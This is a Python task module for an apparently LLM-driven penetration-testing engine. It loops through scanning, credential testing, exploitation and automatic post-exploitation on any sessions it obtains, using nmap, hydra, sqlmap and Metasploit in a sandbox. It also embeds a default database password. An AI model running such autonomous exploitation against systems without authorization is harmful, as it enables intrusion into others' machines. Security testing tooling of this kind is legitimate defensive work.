"""扫描工具检测与执行任务 — 技能驱动的动态 DAG 编排引擎"""

import os

import subprocess

import re

import json

import uuid

import redis

from datetime import datetime

from sqlalchemy import create_engine, text as sa_text

from sqlalchemy.orm import Session
import logging

logger = logging.getLogger(__name__)

from celery_app import app
from tasks.scan_observer import ScanObserver



# ─── 数据库 + Redis ──────────────────────────────────────

DB_URL = os.environ.get("SYNC_DATABASE_URL", os.environ.get("DATABASE_URL", "postgresql://yunjing:yunjing_dev_2026@postgres:5432/yunjing").replace("+asyncpg", ""))

_engine = create_engine(DB_URL, pool_pre_ping=True, pool_size=5)

_redis = redis.Redis.from_url("redis://redis:6379/1", decode_responses=True)



SANDBOX_NAME = "yunjing-sbx"

SANDBOX_ENV = "/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"



# URL helper


def _strip_url(url):
    """Strip http:// or https:// prefix. Handle CIDR without scheme."""
    from urllib.parse import urlparse
    # CIDR (192.168.1.0/24) has no scheme; urlparse gives empty hostname
    if "/" in url and not url.startswith("http"):
        return url.split("/")[0]
    parsed = urlparse(url)
    return parsed.hostname or url

def _parse_target(target):

    """Parse target into (host, port_or_None, original_url)"""

    if not target:

        return target, None, target

    host = target

    port = None

    if "://" in target:

        from urllib.parse import urlparse

        parsed = urlparse(target)

        host = parsed.hostname or target

        port = parsed.port

    elif ":" in target and "/" not in target:

        parts = target.split(":")

        if len(parts) == 2 and parts[1].isdigit():

            host = parts[0]

            port = int(parts[1])

    return host, port, target





def _check_target_alive(target):

    """Liveness check: TCP connect + ping. Returns (alive, info)"""

    import socket as _sock

    host, port, _ = _parse_target(target)

    test_ports = [port] if port else [80, 443, 22, 8080]

    for p in test_ports:

        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)

        s.settimeout(5)

        try:

            s.connect((host, p))

            s.close()

            return True, "TCP " + host + ":" + str(p) + " connected"

        except:

            continue

    try:

        r = _exec(["/usr/bin/ping", "-c", "1", "-W", "3", host], timeout=10)

        if r.returncode == 0:

            return True, "ICMP " + host + " OK"

    except:

        pass

    return False, "unreachable: " + host + str(test_ports)





# ═══════════════════════════════════════════════════════════

#  Sandbox 执行器

# ═══════════════════════════════════════════════════════════



def _exec(args: list[str], timeout: int = 60) -> subprocess.CompletedProcess:

    cmd = ["docker", "exec", "-e", f"PATH={SANDBOX_ENV}", SANDBOX_NAME] + args

    if timeout > 0:
        cmd = ["timeout", "--kill-after=15", str(timeout)] + cmd

    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)



def _exec_tool(tool: str, tool_args: list[str], timeout: int = 120) -> subprocess.CompletedProcess:

    return _exec([tool] + tool_args, timeout=timeout)



def _gen_id() -> str:

    return str(uuid.uuid4())



# ═══════════════════════════════════════════════════════════

#  Redis 进度推送

# ═══════════════════════════════════════════════════════════



def _publish(task_id: str, event_type: str, data: dict):
    # Flatten to top level for frontend WebSocket compatibility
    msg = json.dumps({
        "type": event_type,
        "task_id": task_id,
        **data
    })
    try:
        _redis.publish(f"scan:progress:{task_id}", msg)
    except Exception:
        pass



def _publish_phase(task_id, phase, status, data=None, progress=None):

    d = {"phase": phase, "status": status}

    if data: d["data"] = data

    if progress: d["progress"] = progress

    _publish(task_id, "phase", d)



# ═══════════════════════════════════════════════════════════

#  技能 → 工具/阶段 映射表

# ═══════════════════════════════════════════════════════════



SKILL_PHASES = {

    "net-vuln-scan":           ["asset_discovery", "port_scan", "service_detect", "vuln_scan"],

    "nmap-pentest-scans":      ["asset_discovery", "port_scan", "service_detect"],

    "pentest-workbench":       ["asset_discovery", "port_scan", "service_detect", "vuln_scan", "web_scan", "dir_scan", "web_fuzz", "osint", "exploit", "post_exploit"],

    "pentest-active-directory": ["port_scan", "ad_enum", "krb_scan", "exploit", "post_exploit"],

    "pentest-api-attacker":     ["port_scan", "service_detect", "api_scan", "vuln_scan", "auth_test", "web_fuzz"],

    "pentest-auth-bypass":      ["auth_test", "vuln_scan", "web_fuzz"],

    "pentest-c2-operator":      ["post_exploit"],

    "client-side-pentest":      ["web_scan", "dir_scan", "web_fuzz"],

    "hexstrike":                ["exploit", "post_exploit", "vuln_scan"],

    "security-reviewer":        ["code_scan"],

    "prts-sandbox":             ["asset_discovery", "port_scan", "service_detect", "vuln_scan", "web_scan", "dir_scan", "exploit"],

    "shannon-pentest":          ["osint", "asset_discovery", "port_scan", "service_detect", "vuln_scan", "web_scan", "dir_scan", "web_fuzz", "exploit", "post_exploit"],

    "penetration-tester":       ["osint", "asset_discovery", "port_scan", "service_detect", "vuln_scan", "web_scan", "dir_scan", "web_fuzz", "exploit", "post_exploit"],

    "awesome-pentest":          ["vuln_scan"],

    "s3-pentest-commands":      ["vuln_scan", "api_scan"],

    "senior-security":          ["exploit", "post_exploit"],

    "pentest-commands":         ["reference"],

}



PHASE_ORDER = [

    "osint", "asset_discovery", "port_scan", "service_detect",

    "vuln_scan", "web_scan", "dir_scan", "web_fuzz",

    "api_scan", "auth_test", "ad_enum", "krb_scan",

    "exploit", "post_exploit", "code_scan",

]



PHASE_WEIGHT = {

    "osint": 5, "asset_discovery": 8, "port_scan": 12, "service_detect": 8,

    "vuln_scan": 15, "web_scan": 8, "dir_scan": 6, "web_fuzz": 6,

    "api_scan": 6, "auth_test": 5, "ad_enum": 5, "krb_scan": 5,

    "exploit": 15, "post_exploit": 8, "code_scan": 5,

}



# ═══════════════════════════════════════════════════════════

#  工具版本检测

# ═══════════════════════════════════════════════════════════



TOOLS_CONFIG = {

    # ─── 主机 & 端口扫描 ────────────────────────

    "nmap":       {"path": "/usr/bin/nmap",          "version_flag": "--version"},

    "naabu":      {"path": "/go/bin/naabu",          "version_flag": "-version"},

    # ─── 漏洞扫描 ────────────────────────────────

    "nuclei":     {"path": "/go/bin/nuclei",         "version_flag": "-version"},

    "nikto":      {"path": "/usr/bin/nikto",         "version_flag": "-Version"},

    # ─── Web 扫描 ────────────────────────────────

    "gobuster":   {"path": "/go/bin/gobuster",       "version_flag": "--version"},

    "dirb":       {"path": "/usr/bin/dirb",          "version_flag": ""},

    "dirsearch":  {"path": "/usr/local/bin/dirsearch","version_flag": "--version"},

    "wfuzz":      {"path": "/usr/bin/wfuzz",         "version_flag": "--version"},

    "whatweb":    {"path": "/usr/bin/whatweb",       "version_flag": "--version"},

    "ffuf":       {"path": "/go/bin/ffuf",           "version_flag": "-V"},

    "httpx":      {"path": "/go/bin/httpx",          "version_flag": "-version"},

    "katana":     {"path": "/go/bin/katana",         "version_flag": "-version"},

    # ─── 子域名 / OSINT ──────────────────────────

    "subfinder":  {"path": "/go/bin/subfinder",      "version_flag": "-version"},

    # ─── 暴力破解 ────────────────────────────────

    "hydra":      {"path": "/usr/bin/hydra",         "version_flag": "--version"},

    # ─── SQL 注入 ────────────────────────────────

    "sqlmap":     {"path": "/usr/bin/sqlmap",        "version_flag": "--version"},

    # ─── 利用框架 ────────────────────────────────

    "msfconsole": {"path": "/usr/bin/msfconsole",    "version_flag": "--version"},

    "searchsploit":{"path": "/usr/bin/searchsploit","version_flag": "--version"},

    # ─── 密码破解 ────────────────────────────────

    "hashcat":    {"path": "/usr/bin/hashcat",       "version_flag": "--version"},

    # ─── AD / SMB 枚举 ───────────────────────────

    "enum4linux-ng":{"path": "/usr/bin/enum4linux-ng","version_flag": "-v"},

    "smbclient":  {"path": "/usr/bin/smbclient",     "version_flag": "--version"},

    "smbmap":     {"path": "/usr/bin/smbmap",        "version_flag": "--version"},

    # ─── 工具 ────────────────────────────────────

    "jq":         {"path": "/usr/bin/jq",            "version_flag": "--version"},

}



@app.task(bind=True, max_retries=3)

def check_tool(self, name: str, version_flag: str = "") -> dict:

    cfg = TOOLS_CONFIG.get(name, {})

    tool_path = cfg.get("path", name)

    flag = version_flag or cfg.get("version_flag", "--version")

    try:

        if not flag:

            r = _exec(["which", name], timeout=5)

            if r.returncode != 0:

                r = _exec([tool_path, "--help"], timeout=5)

            ok = r.returncode == 0

            return {"name": name, "installed": ok, "version":"installed" if ok else None, "status":"ready" if ok else "not_installed"}

        r = _exec([tool_path, flag], timeout=15)

        output = (r.stdout or r.stderr or "")

        if r.returncode != 0:

            r = _exec([name, flag], timeout=15)

            output = (r.stdout or r.stderr or "")

        m = re.search(r"version[:\s]*([vV]?[\d][\w.]*)", output, re.IGNORECASE)

        ver = m.group(1).strip() if m else (output.strip().split("\n")[0][:80] if output else "unknown")

        return {"name": name, "installed": True, "version": ver, "status": "ready"}

    except Exception as e:

        return {"name": name, "installed": False, "version": None, "status": "error", "error": str(e)[:80]}





# ═══════════════════════════════════════════════════════════

#  主 DAG 引擎 — 技能感知编排

# ═══════════════════════════════════════════════════════════



SEVERITY_MAP = {

    "critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0,

    "none": 0, "unknown": 0,

}



def _severity_score(s: str) -> int:

    return SEVERITY_MAP.get(s.lower().strip(), 0)





@app.task(bind=True, max_retries=3)
def execute_scan(self, task_id: str, target: str, scan_type: str = "full") -> dict:
    """
    决策循环驱动的动态渗透测试引擎

    没有固定流水线！每步由后端 LLM 根据当前状态 + RAG 经验决策下一步动作。
    流程: 存活检测 → [感知 → LLM决策 → 执行 → 更新状态 → 反死循环]ⁿ → 结束
    """
    db = Session(_engine)
    findings = []
    start_time = datetime.utcnow()

    try:
        # ─── 读取任务配置 ────────────────────────────────
        row = db.execute(
            sa_text("SELECT target, scan_type, result FROM scan_tasks WHERE id=:id"),
            {"id": task_id}
        ).fetchone()
        if not row:
            return {"error": "Task not found"}

        task_target = row[0]
        task_config = json.loads(row[2] or "{}") if isinstance(row[2], str) else (row[2] or {})

        # ─── 更新状态 ────────────────────────────────────
        db.execute(sa_text("UPDATE scan_tasks SET status='RUNNING', updated_at=:now WHERE id=:id"),
                   {"now": start_time, "id": task_id})
        db.commit()

        # -- 存活检测 --
        alive, alive_info = _check_target_alive(target)
        if not alive:
            _publish(task_id, "status", {"status": "FAILED", "progress": 0, "error": alive_info})
            _publish(task_id, "error", {"message": "Target unreachable", "info": alive_info})
            db.execute(sa_text("UPDATE scan_tasks SET status='FAILED', error=:err, completed_at=:now WHERE id=:id"),
                       {"err": alive_info, "now": datetime.utcnow(), "id": task_id})
            db.commit()
            return {"status": "failed", "error": alive_info,
                    "elapsed": (datetime.utcnow() - start_time).total_seconds()}
        _publish(task_id, "liveness_check", {"target": target, "status": "alive", "info": alive_info})

        # ─── 初始化决策循环状态 ───────────────────────────
        host = _parse_target(target)[0]
        # ─── Round 1 深度大摸底 ▸ 替换原有 LLM 决策循环 ──
        if scan_type == "round":
            try:
                from tasks.round_manager import execute_round_1
                _publish(task_id, "round_start", {"round": 1, "target": target, "scan_type": "round"})
                report = execute_round_1(
                    task_id=task_id, target=target, host=host,
                    start_time=start_time, db=db, _engine=_engine,
                    _publish=_publish,
                    execute_action_func=_execute_decision_action,
                    _update_state_func=_update_scan_state,
                )
                _publish(task_id, "round_complete", {"round": 1, "report": {
                    "findings": report["findings_count"],
                    "sessions": len(report["sessions"]),
                    "new_hosts": len(report.get("new_hosts", [])),
                    "suggestions": len(report.get("suggestions", [])),
                }})
                # 更新数据库
                db.execute(sa_text("""UPDATE scan_tasks SET status='COMPLETED',
                    result=:r, progress=100, completed_at=:now WHERE id=:id"""),
                    {"r": json.dumps(report), "now": datetime.utcnow(), "id": task_id})
                db.commit()
                
                # ═══ 写入漏洞到 vulnerabilities 表 ═══
                vulns_written = 0
                for vuln in report.get("vulnerabilities", []):
                    try:
                        v_id = str(uuid.uuid4())
                        db.execute(sa_text("""INSERT INTO vulnerabilities
                            (id, task_id, title, severity, cve_id, cvss_score,
                             target, description, evidence, remediation,
                             references, tool_source, confidence, discovered_at)
                            VALUES (:id, :task_id, :title, :severity, :cve_id, :cvss,
                             :target, :desc, :evidence, :remediation,
                             :refs, :tool, :conf, :now)"""),
                            {"id": v_id, "task_id": task_id,
                             "title": vuln.get("title", "Unknown")[:500],
                             "severity": vuln.get("severity", "medium")[:20],
                             "cve_id": vuln.get("cve_id"), "cvss": vuln.get("cvss_score") or 0.0,
                             "target": target,
                             "desc": vuln.get("description", ""), "evidence": vuln.get("evidence", ""),
                             "remediation": vuln.get("remediation", ""),
                             "refs": json.dumps(vuln.get("references", [])),
                             "tool": vuln.get("tool_source") or vuln.get("tool", "round_1")[:50],
                             "conf": float(vuln.get("confidence", 0.7)),
                             "now": datetime.utcnow()})
                        vulns_written += 1
                    except Exception as ve:
                        logger.warning("Vuln write failed: %s", ve)
                logger.info("[Round 1] Wrote %d vulnerabilities to DB", vulns_written)
                
                # ═══ 提取 findings 作为漏洞（兜底）═══
                stage_results = report.get("stage_results", {})
                for stage_key, stage_data in stage_results.items():
                    for action in stage_data.get("actions", []):
                        findings = action.get("findings") or action.get("result", {}).get("findings", [])
                        if isinstance(findings, list):
                            for f in findings:
                                if isinstance(f, dict) and f not in report.get("vulnerabilities", []):
                                    try:
                                        v_id = str(uuid.uuid4())
                                        sev = "high" if any(k in str(f).lower() for k in ["critical", "vuln", "漏洞", "rce", "sqli", "xss"]) else "medium"
                                        db.execute(sa_text("""INSERT INTO vulnerabilities
                                            (id, task_id, title, severity, target, description,
                                             tool_source, confidence, discovered_at)
                                            VALUES (:id, :tid, :title, :sev, :target, :desc,
                                             :tool, 0.5, :now)"""),
                                            {"id": v_id, "tid": task_id,
                                             "title": str(f.get("title") or f.get("name") or f.get("type") or str(f))[:500],
                                             "sev": sev, "target": target,
                                             "desc": json.dumps(f, ensure_ascii=False),
                                             "tool": str(f.get("source") or f.get("tool") or "round_1_stage")[:50],
                                             "now": datetime.utcnow()})
                                        vulns_written += 1
                                    except Exception:
                                        pass
                logger.info("[Round 1] Total vulns written: %d", vulns_written)
                
                # ═══ 推送完成通知到后端（让 chat 拿到结果）═══
                try:
                    import httpx
                    notify_data = {
                        "task_id": task_id,
                        "target": target,
                        "status": "completed",
                        "findings": report["findings_count"],
                        "sessions": len(report["sessions"]),
                        "suggestions": report.get("suggestions", [])[:3],
                    }
                    httpx.post("http://yunjing-backend:8000/api/scan-callback", json=notify_data, timeout=5)
                except Exception as ne:
                    logger.warning("Scan callback failed: %s", ne)
                
                return report
            except Exception as round_err:
                logger.exception("[Round 1] 执行异常: %s", round_err)
                _publish(task_id, "round_error", {"error": str(round_err)[:200]})
                db.execute(sa_text("UPDATE scan_tasks SET status='FAILED', error=:e, completed_at=:now WHERE id=:id"),
                    {"e": str(round_err)[:500], "now": datetime.utcnow(), "id": task_id})
                db.commit()
                return {"status": "failed", "error": str(round_err)[:500],
                        "elapsed": (datetime.utcnow() - start_time).total_seconds()}

        state = {
            "host": host,
            "ports": [],
            "services": {},
            "vulnerabilities": [],
            "credentials": [],
            "actions_taken": [],
            "findings_count": 0,
        }
        MAX_STEPS = 30
        MAX_ELAPSED = 3600
        MAX_STALE = 5
        stale_count = 0
        observer = ScanObserver(task_id)
        backend_api = "http://yunjing-backend:8000/api/reasoning/next-step"
        all_findings = []

        _publish(task_id, "decision_loop", {
            "status": "started", "target": target, "host": host,
            "max_steps": MAX_STEPS,
        })

        for step in range(1, MAX_STEPS + 1):
            elapsed = (datetime.utcnow() - start_time).total_seconds()
            if elapsed > MAX_ELAPSED:
                _publish(task_id, "decision_loop", {"status": "timeout", "elapsed": elapsed})
                break
            if stale_count >= MAX_STALE:
                _publish(task_id, "decision_loop", {"status": "stale", "stale_count": stale_count})
                break

            # 构建服务快照
            services_simple = {}
            for sp in state["ports"]:
                s = state["services"].get(str(sp), {})
                if s:
                    services_simple[str(sp)] = s

            # ─── [Fix 4] 自动后渗透判断 ──────────────
            decision = {}
            current_sessions = state.get("sessions", [])
            has_post_exploited = any(a == "post_exploit" for a in state.get("actions_taken", []))
            if current_sessions and not has_post_exploited:
                sess_count = len(current_sessions) if isinstance(current_sessions, list) else 1
                step_ratio = step / MAX_STEPS
                if sess_count >= 3 or step_ratio > 0.5:
                    logger.info("[自动后渗透] 会话数=%d, 尝试启动 post_exploit", sess_count)
                    decision = {
                        "action": "post_exploit",
                        "params": {"all_sessions": True},
                        "reasoning": f"已有 {sess_count} 个活动会话, 自动执行后渗透",
                    }
                    state["_auto_post_exploit_pending"] = True
                    action_name = "post_exploit"
                    action_params = {"all_sessions": True}
                    action_reasoning = f"已有 {sess_count} 个活动会话, 自动执行后渗透"
                    _publish(task_id, "auto_post_exploit", {"sessions": sess_count})
                    # 不 continue - 让代码正常落入 LLM 决策段，但 LLM 会看到已有的 decision
                    # 将 decision 设为已有，LLM 段会直接使用
            # ─── 1. LLM 决策 ──────────────────────────────
            if not decision.get("action"):
                decision = {}
            try:
                import httpx as _httpx
                resp = _httpx.post(backend_api, json={
                    "task_id": task_id,
                    "target": target,
                    "step": step,
                    "elapsed_seconds": int(elapsed),
                    "ports": state["ports"],
                    "services": services_simple,
                    "vulnerabilities": state["vulnerabilities"][-20:],
                    "credentials": state["credentials"],
                    "actions_taken": state["actions_taken"],
                    "stale_count": stale_count,
                    "max_remaining": MAX_STEPS - step,
                }, timeout=25)
                if resp.status_code == 200:
                    decision = resp.json()
            except Exception as e:
                _publish(task_id, "decision_error", {"step": step, "error": str(e)[:100]})

            action_name = decision.get("action", "") if decision else ""
            action_params = decision.get("params", {}) if decision else {}
            action_reasoning = decision.get("reasoning", "") if decision else ""

# ─── [auto override] 若自动后渗透已触发，覆盖 LLM 决策
            if state.get("_auto_post_exploit_pending", False):
                logger.info("[自动后渗透] 覆盖 LLM 决策 %s -> post_exploit", action_name)
                action_name = "post_exploit"
                action_params = {"all_sessions": True}
                action_reasoning = f"自动后渗透: 已有会话"
                state["_auto_post_exploit_pending"] = False
            # resilience：总是尝试从 reasoning 提取嵌套 action（优先）
            if action_reasoning:
                if isinstance(action_reasoning, dict):
                    inner = action_reasoning
                    if inner.get("action"):
                        action_name = inner["action"]
                        action_params = inner.get("params", {})
                        action_reasoning = inner.get("reasoning", action_reasoning)
                        logger.info("[决策循环] 从 reasoning 提取 action: %s", action_name)
                elif isinstance(action_reasoning, str):
                    try:
                        inner = json.loads(action_reasoning)
                        if isinstance(inner, dict) and inner.get("action"):
                            action_name = inner["action"]
                            action_params = inner.get("params", {})
                            action_reasoning = inner.get("reasoning", action_reasoning)
                            logger.info("[决策循环] 从 reasoning 提取 action: %s", action_name)
                    except (json.JSONDecodeError, TypeError):
                        pass

            # fallback: 仅在 action 为空时
            if not action_name:
                if state["ports"] and not state["services"]:
                    action_name = "service_detect"
                elif state["ports"]:
                    action_name = "vuln_scan"
                else:
                    action_name = "quick_port_scan"

            if action_name in ("complete", "stop"):
                break

            # ─── 2. 执行 ──────────────────────────────────
            logger.info("[决策循环 Step %d/%d] LLM 决策: action=%s, reasoning=%.150s",
                        step, MAX_STEPS, action_name, action_reasoning)
            _publish(task_id, "decision_step", {
                "step": step, "action": action_name,
                "reasoning": action_reasoning[:200],
                "progress": int(step / MAX_STEPS * 100),
                "status": "RUNNING",
                "phase": action_name,
            })

            result = _execute_decision_action(task_id, target, action_name, action_params, state)

            logger.info("[决策循环 Step %d/%d] ✅ 执行完成: action=%s, findings=%d, ports=%s, elapsed=%.0fs",
                        step, MAX_STEPS, action_name,
                        len(result.get("findings", [])),
                        sorted(state["ports"])[:10],
                        (datetime.utcnow() - start_time).total_seconds())

            # ─── 3. 更新状态 ──────────────────────────────
            old_findings = state["findings_count"]
            _update_scan_state(state, action_name, result)
            state["actions_taken"].append(action_name)

            for f in result.get("findings", []):
                all_findings.append(f)

            # Publish step result for frontend execution pipeline
            _publish(task_id, "step_complete", {
                "step": step,
                "action": action_name,
                "progress": int((step + 1) / MAX_STEPS * 100),
                "status": "RUNNING",
                "phase": action_name,
                "phase_result": {
                    "action": action_name,
                    "findings": len(result.get("findings", [])),
                    "ports": sorted(state["ports"])[:10],
                    "sessions": len(result.get("sessions", []) or result.get("sessions_created", [])),
                }
            })

            # ─── 3.4 经验自蒸馏 ──────────────────────────
            if action_name in ("exploit", "post_exploit") and (result.get("sessions_created") or result.get("sessions")):
                try:
                    from tasks.experience_distill import distill_from_exploit
                    distill_from_exploit(state, result, action_params, target)
                except Exception as exc:
                    logger.warning("[经验蒸馏] 蒸馏失败: %s", exc)

            # ─── 3.5 Observer 旁路监督 ───────────────────
            obs_signal = observer.observe(action_name, result, state)
            if obs_signal and obs_signal.get("severity") == "fatal":
                logger.warning("[Observer] ⛔ 熔断: %s", obs_signal["message"])
                _publish(task_id, "observer_fatal", obs_signal)
                break
            elif obs_signal and obs_signal.get("severity") == "warning":
                logger.warning("[Observer] ⚠️ 警告: %s", obs_signal["message"])
                _publish(task_id, "observer_warning", obs_signal)
                if step >= MAX_STEPS - 5:
                    break

            # ─── 4. 反死循环 ──────────────────────────────
            if state["findings_count"] > old_findings:
                stale_count = 0
            else:
                stale_count += 1

            # ─── 5. 进度推送 ──────────────────────────────
            progress_pct = min(int((step / MAX_STEPS) * 100), 99)
            _publish(task_id, "decision_progress", {
                "step": step, "progress": progress_pct,
                "action": action_name,
                "ports": state["ports"],
                "vulns_found": state["findings_count"],
                "stale_count": stale_count,
            })

            # ─── 6. 每步写 DB ──────────────────────────
            if True:
                try:
                    mid_result = {
                        "actions_taken": state["actions_taken"],
                        "ports": state["ports"],
                        "findings_count": state["findings_count"],
                        "decision_steps": len(state["actions_taken"]),
                        "credentials": state.get("credentials", []),
                        "sessions": state.get("sessions", []),
                        "exploit_results": state.get("exploit_results", []),
                    }
                    db.execute(sa_text("""UPDATE scan_tasks SET progress=:p,
                        result=:r, updated_at=:n WHERE id=:id"""),
                        {"p": progress_pct, "r": json.dumps(mid_result),
                         "n": datetime.utcnow(), "id": task_id})
                    db.commit()
                except Exception as exc:
                    logger.warning("[决策循环] DB 周期更新失败: %s", exc)

        # ─── 最终状态写入 DB ─────────────────────────────
        try:
            # 会话去重: 按 (target, type, username) 去重, 保留最新
            raw_sessions = state.get("sessions", [])
            seen_sessions = {}
            for s in raw_sessions:
                key = (s.get("target","?"), s.get("type","?"), s.get("username","?"))
                seen_sessions[key] = s  # overwrite keeps the last one
            deduped_sessions = list(seen_sessions.values())
            final_result = {
                "actions_taken": state["actions_taken"],
                "ports": state["ports"],
                "findings_count": state["findings_count"],
                "decision_steps": len(state["actions_taken"]),
                "credentials": state.get("credentials", []),
                "sessions": deduped_sessions,
                "exploit_results": state.get("exploit_results", []),
            }
            db.execute(sa_text("""UPDATE scan_tasks SET progress=100,
                result=:r, updated_at=:n WHERE id=:id"""),
                {"r": json.dumps(final_result),
                 "n": datetime.utcnow(), "id": task_id})
            db.commit()
        except Exception as exc:
            logger.warning("[决策循环] 最终状态写入失败: %s", exc)

        # ─── 记录完成情况 ────────────────────────────────
        _publish(task_id, "decision_loop_end", {
            "status": "completed", "steps": step,
            "total_findings": state["findings_count"],
            "ports_found": len(state["ports"]),
        })

        # ─── 归一化 + 去重 ──────────────────────────────
        all_findings = _dedup_findings(all_findings)

        # ─── 写入数据库 ─────────────────────────────────
        for f in all_findings:
            db.execute(sa_text("""
                INSERT INTO vulnerabilities (id, task_id, title, severity, cve_id, cvss_score,
                    target, description, evidence, remediation, "references", tool_source, confidence)
                VALUES (:id, :tid, :title, :sev, :cve, :cvss, :target, :desc, :ev, :rem, :ref, :tool, :conf)
            """), {
                "id": _gen_id(),
                "tid": task_id,
                "title": f.get("title", "Unknown"),
                "sev": f.get("severity", "info"),
                "cve": f.get("cve_id"),
                "cvss": f.get("cvss_score"),
                "target": target,
                "desc": f.get("description", "")[:1000],
                "ev": f.get("evidence", "")[:500],
                "rem": f.get("remediation", "")[:500],
                "ref": json.dumps(f.get("references", [])),
                "tool": f.get("tool_source", "unknown"),
                "conf": f.get("confidence", 0.5),
            })
        db.commit()

        # ─── 最终摘要 ──────────────────────────────────
        ports_detail = []
        for p in state["ports"]:
            svc = state["services"].get(str(p), {})
            ports_detail.append({
                "port": p,
                "service": svc.get("name", "unknown"),
                "product": svc.get("product", ""),
                "version": svc.get("version", ""),
            })

        summary = {
            "total": len(all_findings),
            "critical": sum(1 for f in all_findings if f.get("severity") == "critical"),
            "high": sum(1 for f in all_findings if f.get("severity") == "high"),
            "medium": sum(1 for f in all_findings if f.get("severity") == "medium"),
            "low": sum(1 for f in all_findings if f.get("severity") == "low"),
            "info": sum(1 for f in all_findings if f.get("severity") == "info"),
            "ports_found": len(state["ports"]),
            "ports": sorted(state["ports"]),
            "services_detailed": ports_detail,
            "vulnerability_names": [f.get("title", "") for f in all_findings[:50]],
            "actions_taken": state["actions_taken"],
            "decision_steps": len(state["actions_taken"]),
            "findings_count": state["findings_count"],
            "credentials": state.get("credentials", []),
            "sessions": state.get("sessions", []) if isinstance(state.get("sessions", []), list) else list(state.get("sessions", {}).values()),
        }
        elapsed = (datetime.utcnow() - start_time).total_seconds()

        db.execute(sa_text("""
            UPDATE scan_tasks SET status='COMPLETED', progress=100,
                result=:result, completed_at=:now, updated_at=:now
            WHERE id=:id
        """), {"result": json.dumps(summary), "now": datetime.utcnow(), "id": task_id})
        db.commit()

        _publish(task_id, "completed", {
            "status": "COMPLETED", "progress": 100,
            "summary": summary, "elapsed": round(elapsed, 1),
        })

        # ─── 扫描结果回灌 ────────────────────────────────
        try:
            import urllib.request as _urq
            cb = json.dumps({
                "task_id": task_id, "target": target,
                "scan_type": scan_type, "status": "completed",
                "findings": all_findings[-100:],
                "vuln_count": len([f for f in all_findings if f.get("severity") in ("critical", "high", "medium")]),
            }).encode()
            _urq.urlopen(_urq.Request(
                "http://yunjing-backend:8000/api/engine/scan-callback",
                data=cb, headers={"Content-Type": "application/json"}, method="POST",
            ), timeout=5)
        except Exception:
            import logging
            logging.getLogger(__name__).warning("[扫描回调] 回灌失败", exc_info=True)

        return {
            "status": "completed", "task_id": task_id,
            "findings": len(all_findings), "elapsed": round(elapsed, 1),
            "target": target, "summary": summary,
        }

    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        try:
            db.execute(sa_text("UPDATE scan_tasks SET status='FAILED', error=:err, updated_at=:now WHERE id=:id"),
                       {"err": str(e)[:500], "now": datetime.utcnow(), "id": task_id})
            db.commit()
        except Exception:
            pass
        _publish(task_id, "failed", {"status": "FAILED", "error": str(e)[:500]})
        raise e
    finally:
        db.close()




# ═══════════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════════
#  决策循环辅助函数 — 动作调度器 + 状态管理器
# ═══════════════════════════════════════════════════════════

ACTION_ROUTER = {}


def _register_actions():
    """注册所有可用动作到路由表"""
    global ACTION_ROUTER
    ACTION_ROUTER = {
        "quick_port_scan": (_action_port_scan, "快速端口扫描"),
        "full_port_scan": (_action_full_port_scan, "全端口扫描"),
        "service_detect": (_action_service_detect, "服务版本检测"),
        "vuln_scan": (_action_vuln_scan, "漏洞扫描"),
        "dir_bruteforce": (_action_dir_bruteforce, "Web目录爆破"),
        "web_tech_detect": (_action_web_tech, "Web技术栈识别"),
        "nikto_scan": (_action_nikto_scan, "Web服务器深度扫描"),
        "credential_test": (_action_credential_test, "凭据测试"),
        "sql_injection_test": (_action_sql_injection, "SQL注入检测"),
        "auth_bypass_test": (_action_auth_bypass, "认证绕过检测"),
        "web_fuzz": (_action_web_fuzz, "Web参数模糊测试"),
        "api_scan": (_action_api_scan, "API安全扫描"),
        "smb_enum": (_action_smb_enum, "SMB枚举"),
        "lateral_probe": (_action_lateral_probe, "横向探测"),
        "exploit": (_action_exploit, "漏洞利用 - 尝试建立会话"),
        "post_exploit": (_action_post_exploit, "后渗透操作"),
    }


def _execute_decision_action(task_id, target, action_name, params, state):
    """执行决策动作 — 调度到具体的原子动作处理器"""
    if not ACTION_ROUTER:
        _register_actions()
    handler = ACTION_ROUTER.get(action_name)
    if not handler:
        _publish(task_id, "unknown_action", {"action": action_name})
        return {"findings": [], "summary": f"Unknown action: {action_name}"}
    try:
        result = handler[0](task_id, target, params, state)
        return result if isinstance(result, dict) else {"findings": [], "summary": str(result)}
    except Exception as e:
        _publish(task_id, "action_error", {"action": action_name, "error": str(e)[:200]})
        return {"findings": [], "error": str(e)[:200]}


def _update_scan_state(state, action_name, result):
    """根据动作结果更新扫描状态"""
    findings = result.get("findings", []) or []
    state["findings_count"] += len(findings)
    for f in findings:
        if f.get("severity"):
            state["vulnerabilities"].append({
                "title": f.get("title", ""),
                "severity": f.get("severity", "info"),
            })
    new_ports = result.get("ports", []) or []
    for p in new_ports:
        if p not in state["ports"]:
            state["ports"].append(p)
            state["findings_count"] += 1
    new_services = result.get("services", []) or []
    for svc in new_services:
        port = svc.get("port", svc.get("port_id"))
        if port:
            state["services"][str(port)] = svc
            if port not in state["ports"]:
                state["ports"].append(port)
    new_creds = result.get("credentials", []) or []
    for c in new_creds:
        if c not in state["credentials"]:
            state["credentials"].append(c)
            state["findings_count"] += 1
    # 处理 sessions
    new_sessions = result.get("sessions_created", []) or result.get("sessions", []) or []
    for s in new_sessions:
        sid = s.get("session_id", s.get("id", ""))
        if sid and sid not in [x.get("session_id","") for x in state.get("sessions", [])]:
            if "sessions" not in state:
                state["sessions"] = []
            state["sessions"].append(s)
            state["findings_count"] += 1
    # 同步到 SessionManager 中的会话（标记在 state 中）
    sm_sessions = []
    try:
        from app.exploit_engine import SessionManager
        _sm = SessionManager()
        sm_sessions = _sm.list(task_id=task_id)
    except:
        pass
    for sess_obj in sm_sessions:
        sid = sess_obj.get("id", "")
        if sid not in [x.get("session_id","") for x in state.get("sessions", [])]:
            if "sessions" not in state:
                state["sessions"] = []
            state["sessions"].append({
                "session_id": sid,
                "type": sess_obj.get("session_type", ""),
                "access_level": sess_obj.get("access_level", ""),
                "username": sess_obj.get("username", ""),
                "target": sess_obj.get("target", ""),
                "port": sess_obj.get("port", 0),
                "alive": sess_obj.get("alive", True),
            })
    state["ports"] = sorted(set(state["ports"]))


